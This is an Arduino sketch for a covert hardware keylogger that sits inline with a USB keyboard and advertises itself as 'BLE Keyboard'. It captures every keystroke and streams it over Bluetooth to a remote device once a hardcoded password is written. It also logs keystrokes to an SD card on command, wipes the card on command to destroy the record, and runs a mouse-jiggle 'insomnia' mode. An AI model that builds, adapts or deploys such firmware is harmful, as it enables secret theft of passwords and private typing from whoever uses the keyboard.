/*
 * Receive ASCII text from Serial1 and convert to USB HID report.
 * Send HID report out USB interface.
 * Maps out keystrokes and sends out data over ble when a central device is connected
 * Added a BLE password Characteristic to trigger transmission of keystrokes (10/8/20, Jonathan Fischer)
 *   - keystroke and password data overwritten to empty data when not transmitting
 * Changing how keystrokes are read and relayed over BLE - Phase 1C (10/9/20, Jonathan Fischer)
 *   - a lag was discovered when the nano was transmitting keystrokes to the xbee so connection was moved to a second nano
 *   - added parameters for insomnia mode and mode selection, renamed transmitChar to passwordChar to better reflect function
 *   - mode selection needs to be implemented and activation password should possibly control all modes as well
 *   - one think to note for future use is if power is supplied to the keyboards in vdi mode, we may consider trying to store some modes in eeprom
 *     so they don't need to be reset upon power down
 * Phase 1D - Added SD card support to log keystrokes.  It is toggled on it's own parameter via BLE. 10/13/20, Jonathan Fischer
 * Phase 1E - Add function to wipe SD card of all file and directories (10/13/20, Jonathan Fischer)
 * Rename to BLEPeripheral to better reflect function (10/13/20, Jonathan Fischer)
 */

#include <Keyboard.h>
#include <ArduinoBLE.h>
#include <Mouse.h>
#include <SPI.h>
#include <SD.h>

File myFile;

///Setup BLE parameters///
BLEService keyboardService("C103");
BLEService commandService("C104");
BLECharacteristic passwordChar("0110", BLEWrite, 20);
BLECharacteristic keyLoggerChar("0111", BLERead | BLEIndicate, 20);
BLECharacteristic mouseChar("0101", BLEWrite, 8);
BLECharacteristic modeChar("0100", BLEWrite, 20);
BLECharacteristic recordChar("0200", BLEWrite, 8);
BLECharacteristic wipeChar("0210", BLEWrite, 8);


//password variables for tx of keystrokes
bool tx = false;
char passdata[20];
char emptydata[20];

//variables for record mode
char recorddata[8];
bool recordKeys = false;

//variables for insomnia mode + emptydata above to clear buffer
char mousedata[8];
bool insomnia = false;

//variables for wipe card mode
char wipedata[8];

#if 0
/* Arduino Zero */
#define SERDEBUG  Serial1
#define USBEvent  Serial
#endif

#if 1
/* Trinket M0 or 32u4 */
#define SERDEBUG  Serial
#define USBEvent  Serial1
#endif

char aLine[81];
uint8_t aLine_count = 0;

void setup()
{
#ifdef SERDEBUG
  SERDEBUG.begin(115200);
#endif
  USBEvent.begin(115200);
  aLine_count = 0;

    //begin BLE code here
    // begin initialization
  if (!BLE.begin()) {
    Serial.println("starting BLE failed!");

    while (1);
  }

  //
  BLE.setLocalName("BLE Keyboard");
  BLE.setDeviceName("Keyboard");
  BLE.setAdvertisedService(keyboardService);
  keyboardService.addCharacteristic(modeChar);
  keyboardService.addCharacteristic(mouseChar);
  keyboardService.addCharacteristic(passwordChar);
  keyboardService.addCharacteristic(keyLoggerChar);
  BLE.addService(keyboardService);
  BLE.setAdvertisedService(commandService);
  commandService.addCharacteristic(recordChar);
  commandService.addCharacteristic(wipeChar);
  BLE.addService(commandService);
  BLE.advertise();

  //Start SD card parameters
  Serial.print("Initializing SD card...");
  if (!SD.begin(4)) {
    Serial.println("initialization failed!");
    while (1);
  }
  Serial.println("initialization done.");
}

uint8_t params2bin(char *buf, uint8_t *outbuf, uint8_t outbuf_len)
{
  char *p;
  uint8_t outbuf_count = 0;

  memset(outbuf, 0, outbuf_len);
  p = strtok(buf, ",");
  while (p != NULL && outbuf_count < outbuf_len) {
    *outbuf++ = strtoul(p, NULL, 10);
    outbuf_count++;
    p = strtok(NULL, ",");
  }
  return outbuf_count;
}

void loop()
{  
BLEDevice central = BLE.central();

//Check toggled controls
getInsomnia();
getRecord();
getWipe();

if (insomnia) {
  Mouse.move(1, 0);
  Mouse.move(-1,0);
  Mouse.end();
}

//Check activation password
if (passwordChar.written()) {
  Serial.println("Write detected");
  passwordChar.readValue(passdata, 9);
  String password = passdata;
  Serial.print("Password: ");
  Serial.println(password);
  //if (password == "8ajI=6otrlb@l?lp"){
  if (password == "pass"){
    Serial.println("Password accepted");
    tx = true;
    for (byte i = 0; i < sizeof(passdata); i++) passdata[i] = emptydata[i];
    passwordChar.writeValue(passdata,20);
  }
  else {
    if (tx) {
      keyLoggerChar.writeValue(emptydata,20);
    }
    tx = false;
  }
}

#ifdef SERDEBUG
  if (SERDEBUG.available() > 0) {
    char c = SERDEBUG.read();
    USBEvent.write(c);
  }
#endif

  if (USBEvent.available() > 0) {
    char c = USBEvent.read();
#ifdef SERDEBUG
    SERDEBUG.print("c 0x"); SERDEBUG.println(c, HEX);
#endif
    if (c == '\n' || aLine_count >= sizeof(aLine)) {
      aLine[aLine_count] = '\0';
#ifdef SERDEBUG
      SERDEBUG.println(aLine);
#endif
      char command = aLine[0];
      uint8_t rawdata[8];
      uint8_t raw_len = params2bin(aLine+2, rawdata, sizeof(rawdata));
      aLine_count = 0;
      String message = "";
      if (raw_len > 0) {
        switch (command) {
          // Keyboard HID report
          case 'K':
          case 'k':
            if (raw_len != 8) break;
            HID().SendReport(2, rawdata, sizeof(KeyReport));
            char keyArray[20];
            sprintf(keyArray, "%d,%d,%d,%d,%d,%d,%d,%d", rawdata[0], rawdata[1], rawdata[2], rawdata[3], rawdata[4], rawdata[5], rawdata[6], rawdata[7]);
            if (tx) {
              keyLoggerChar.writeValue(keyArray);
              Serial.println(keyArray);
            }
            if (recordKeys) {
              Serial.println("Creating keypress.txt...");
              myFile = SD.open("keypress.txt", FILE_WRITE);
              String keys = keyArray;
              myFile.println(keys);
              myFile.close();
            }
            break;
        }
      }
    }
    else {
      aLine[aLine_count++] = c;
    }
  }
}

void getInsomnia(){
  if (mouseChar.written()){
    Serial.println("Mouse Write Detected");
    mouseChar.readValue(mousedata,8);
    String mouse = mousedata;
    Serial.print("mouse: ");
    Serial.println(mouse);
    for (byte i = 0; i < sizeof(mousedata); i++) mousedata[i] = emptydata[i];
    if (mouse == "Caffeine"){
      Serial.println("Insomnia mode active");
      insomnia = true;
    }
    else {
      Serial.println("Sleep mode is now allowed");
      insomnia = false;
    }
  }
}

void getRecord(){
    if (recordChar.written()){
      Serial.println("Record Write Detected");
      recordChar.readValue(recorddata,8);
      String writeData = recorddata;
      Serial.print("writeData: ");
      Serial.println(writeData);
      if (writeData == "Record"){
        Serial.println("Record mode active");
        recordKeys = true;
      }
      else{
        recordKeys = false;
      }
      for (byte i = 0; i < sizeof(recorddata); i++) recorddata[i] = emptydata[i];
      Serial.print("Record: ");
      Serial.println(recordKeys);
  }
}

void getWipe(){
      if (wipeChar.written()){
      Serial.println("Wipe Write Detected");
      wipeChar.readValue(wipedata,8);
      String wipe = wipedata;
      Serial.print("wipe: ");
      Serial.println(wipe);
      if (wipe == "wipe"){
        Serial.println("Wipe mode active");
        myFile = SD.open("/");
        wipeCard(myFile, "/");
      }
      else{
        Serial.println("Wipe mode not activated");
      }
      for (byte i = 0; i < sizeof(wipedata); i++) wipedata[i] = emptydata[i];
  }
}

void wipeCard(File dir, String d) {
  while (true) {
    String dirname = d;
    File entry =  dir.openNextFile();
    if (! entry) {
      // no more files
      break;
    }
    String filename = entry.name();
    if (entry.isDirectory()) {
      dirname.concat(entry.name());
      dirname.concat("/");
      wipeCard(entry, dirname);
      SD.rmdir(dirname);
    } else {
      // files have sizes, directories do not
      dirname.concat(entry.name());
      SD.remove(dirname);
    }
    entry.close();
  }
}
